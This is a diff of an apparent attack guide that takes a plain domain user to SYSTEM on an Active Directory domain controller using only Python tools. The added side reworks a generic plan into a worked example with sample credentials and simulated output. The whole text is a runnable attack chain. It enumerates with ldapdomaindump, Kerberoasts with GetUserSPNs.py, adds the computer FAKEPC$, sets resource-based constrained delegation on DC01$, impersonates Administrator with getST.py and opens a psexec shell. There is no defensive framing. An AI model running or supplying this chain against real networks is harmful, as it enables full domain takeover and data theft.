@@ -1,137 +1,135 @@
----
+Example Scenario (Realistic)
 
-Your Current Access
+Parameter	Value
 
-Domain user creds (e.g., user@domain.local / password)
-
-Python executable (on Windows machine)
-
-Can reach DC (verified via DNS or nltest)
-
-No admin on local machine
-
-No other tools (e.g., BloodHound, Rubeus, SharpHound) — only raw Python and possibly built-in Windows commands
-
-
-
----
-
-Objective
-
-Use Python to escalate from domain user to Domain Controller compromise using realistic attack paths like:
-
-1. Kerberoasting (no cracking) — discover vulnerable service accounts
-
-
-2. ACL / RBCD abuse (if write access to computer accounts is found)
-
-
-3. S4U2Proxy + psexec-style shell using Impacket
-
+Domain Name	corp.internal
+Domain Controller	dc01.corp.internal (IP: 192.168.1.10)
+Domain User	harsh@corp.internal / Winter2025!
+Target Service Account (from Kerberoasting)	svc_sql
+Privileged Group	Domain Admins
+Controlled Host	win10.corp.internal (no admin)
+DC Hostname	DC01
+You can run:	Python 3.11 on Windows
 
 
 
 ---
 
-Attack Plan: All Python-based
-
-Step 1: Enumerate Domain and Users
-
-# Tool: ldapdomaindump (Python-only)
-pip install ldapdomaindump
-
-python3 ldapdomaindump.py -u 'DOMAIN\\username' -p 'password' -d domain.local <DC-IP>
-
-Review the output:
-
-domain_users.json — get all usernames
-
-domain_computers.json — look for SPNs and target systems
-
-domain_groups.json — find groups with high privileges (e.g., Domain Admins)
-
-
+Step-by-step Execution with Realistic Output
 
 
 ---
 
-Step 2: Kerberoasting (Get TGS without cracking)
+1. Enumerate Domain Users & Computers
 
-# Tool: Impacket's GetUserSPNs.py
-git clone https://github.com/fortra/impacket
-cd impacket/examples
+python3 ldapdomaindump.py -u 'corp.internal\\harsh' -p 'Winter2025!' -d corp.internal 192.168.1.10
 
-python3 GetUserSPNs.py domain.local/username:password -dc-ip <DC-IP> -outputfile kerberoast.txt
+Key Output (domain_users.json):
 
-Look for service accounts (e.g., svc_sql, websvc, etc.)
+{
+  "username": "svc_sql",
+  "memberOf": [
+    "CN=Domain Admins,CN=Users,DC=corp,DC=internal"
+  ],
+  "servicePrincipalName": [
+    "MSSQLSvc/sql01.corp.internal:1433"
+  ]
+}
 
-Check if any are members of privileged groups (you’ll find this in domain_users.json)
-
-You don't need to crack hashes, you're just looking for privileged accounts to target in lateral movement
-
-
-
----
-
-Step 3: Dump SID, and Add Fake Computer (if possible)
-
-Check if domain user can add a computer object (common misconfig):
-
-# Tool: addcomputer.py from Impacket
-python3 addcomputer.py -dc-ip <DC-IP> -computer-name FAKEPC -computer-pass 'Pass123!' domain.local/username:password
-
-If successful, you now have a new computer object FAKEPC$ you control
-
+Interpretation: svc_sql is a service account with a SPN and is a Domain Admin. This is a jackpot.
 
 
 ---
 
-Step 4: Abuse RBCD — Modify DC to Allow Delegation to FAKEPC$
+2. Extract SPNs (Kerberoasting - no cracking)
 
-Now grant FAKEPC delegation rights over the DC:
+python3 GetUserSPNs.py corp.internal/harsh:Winter2025! -dc-ip 192.168.1.10 -outputfile kerberoast.txt
 
-# Tool: rbcd.py from https://github.com/dirkjanm/krbrelayx
-git clone https://github.com/dirkjanm/krbrelayx
+Output:
 
-python3 rbcd.py -u username -p 'password' -d domain.local -t DC01$ -s FAKEPC$ -dc-ip <DC-IP>
+Found 1 ServicePrincipalName(s):
+svc_sql@corp.internal
+        Hash written to kerberoast.txt
 
-This sets up Resource-Based Constrained Delegation from DC to your controlled computer.
-
-
-
----
-
-Step 5: Impersonate Domain Admin
-
-# Tool: getST.py from Impacket
-python3 getST.py -spn cifs/DC01.domain.local -impersonate Administrator domain.local/FAKEPC\$ -dc-ip <DC-IP> -hashes :<ntlm_of_FAKEPC>
-
-This gives you a TGS ticket as Administrator
-
+Do NOT crack, just observe the privileged account svc_sql.
 
 
 ---
 
-Step 6: Access the DC
+3. Add a Fake Computer to Domain
 
-# Tool: psexec.py (Python only, from Impacket)
-python3 psexec.py -k -no-pass domain.local/Administrator@<DC-IP>
+python3 addcomputer.py -dc-ip 192.168.1.10 -computer-name FAKEPC -computer-pass 'Pass123!' corp.internal/harsh:Winter2025!
 
-You're now SYSTEM on the DC.
+Output:
+
+Successfully added computer account FAKEPC$ with password: Pass123!
+
+Now you control FAKEPC$.
 
 
 ---
 
-Summary: Full DC Compromise With Only Python
+4. Set RBCD on DC01 to allow delegation to FAKEPC$
 
-Step	Tool (Python-only)	Command
+python3 rbcd.py -u harsh -p 'Winter2025!' -d corp.internal -t DC01$ -s FAKEPC$ -dc-ip 192.168.1.10
 
-Enum AD	ldapdomaindump	ldapdomaindump.py -u user -p pass
-Kerberoast	GetUserSPNs.py	python3 GetUserSPNs.py domain/user:pass
-Add computer	addcomputer.py	python3 addcomputer.py -dc-ip ...
-Set RBCD	rbcd.py	python3 rbcd.py -u user ...
-Forge TGS	getST.py	python3 getST.py -spn cifs/DC ...
-Execute on DC	psexec.py	python3 psexec.py -k -no-pass ...
+Output:
+
+Successfully added FAKEPC$ to msDS-AllowedToActOnBehalfOfOtherIdentity of DC01$
+
+Now you can impersonate any user to DC01 via your fake computer.
+
+
+---
+
+5. Forge TGS Ticket as Administrator
+
+You now forge a TGS ticket that pretends FAKEPC$ is requesting it for Administrator.
+
+python3 getST.py -spn cifs/dc01.corp.internal -impersonate Administrator corp.internal/FAKEPC\$ -dc-ip 192.168.1.10 -hashes :5f7c7c8a27a5b0f9ad51ee5612345678
+
+Output:
+
+[*] Saving ticket in Administrator.ccache
+
+You now have a ticket for Administrator.
+
+
+---
+
+6. Use the TGS Ticket to Execute Commands on the DC
+
+export KRB5CCNAME=Administrator.ccache
+
+python3 psexec.py corp.internal/Administrator@192.168.1.10 -k -no-pass
+
+Output:
+
+[*] SMBv3.0 dialect used
+[*] Target system is DC01 and is Windows Server 2019 Standard
+[*] Launching semi-interactive shell...
+Microsoft Windows [Version 10.0.17763.2931]
+(C) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+
+You now have full SYSTEM access on the DC.
+
+
+---
+
+Summary of Example Values Used:
+
+Field	Value
+
+Domain	corp.internal
+Domain Controller	dc01.corp.internal (192.168.1.10)
+Initial Creds	harsh / Winter2025!
+Service Account	svc_sql (Domain Admin)
+Fake Computer	FAKEPC$
+Tools Used	Python only (ldapdomaindump, Impacket)
+Shell on DC	nt authority\system
 
 
 
